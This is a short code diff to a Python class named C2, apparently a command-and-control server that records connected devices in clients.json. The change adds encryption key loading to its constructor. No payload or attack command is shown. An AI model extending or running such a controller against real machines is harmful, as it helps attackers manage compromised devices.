@@ -13,12 +13,18 @@ import time
 import geocoder
 import ipaddress
 import threading
+from encryption import encrypt_messages
 
 class C2:
     def __init__(self, sio):
         self.sio = sio
         self.devices = {}
         self.total_devices = {}
+
+        keys = encrypt_messages()
+        self.public_key = keys.receive_public_key()
+        self.private_key = keys.receive_private_key()
+
         try:
             with open("clients.json", "r") as f:
                 self.total_devices = json.load(f)
